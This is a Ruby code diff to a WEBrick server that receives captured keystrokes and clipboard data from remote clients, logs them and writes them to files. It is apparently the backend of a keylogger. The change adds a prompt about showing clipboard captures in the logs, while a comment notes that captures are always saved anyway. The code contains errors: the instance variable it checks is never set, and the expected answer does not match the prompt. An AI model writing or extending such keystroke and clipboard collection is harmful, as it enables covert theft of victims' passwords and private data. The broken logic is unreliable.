@@ -17,6 +17,9 @@ require 'webrick'
 require 'json'
 require 'logger'
 
+print "Do you want to display the captured clipboard data in the logs? (y/N): " # If the user didn't allow it, the captured clipboard will still be saved to saved_captures.txt by default
+show_clipboard_in_logs = gets.chomp.downcase == 'yes'
+
 class MyServlet < WEBrick::HTTPServlet::AbstractServlet
   # Initialize the servlet with a logger and file path
   def initialize(server, keystrokes_file_path, clipboard_file_path)
@@ -36,7 +39,10 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
       clipboard_data = data['clipboardData'] || ''
       
       @logger.info("Received Keystrokes: #{keyboard_data}") # Log received keystrokes
-      @logger.info("Received Clipboard Data: #{clipboard_data}") # Log received clipboard data
+
+      if @show_clipboard_in_logs
+         @logger.info("Received Clipboard Data: #{clipboard_data}") # Log received clipboard data
+      end
       
       save_to_file(@keystrokes_file_path, keyboard_data)
       save_to_file(@clipboard_file_path, clipboard_data)
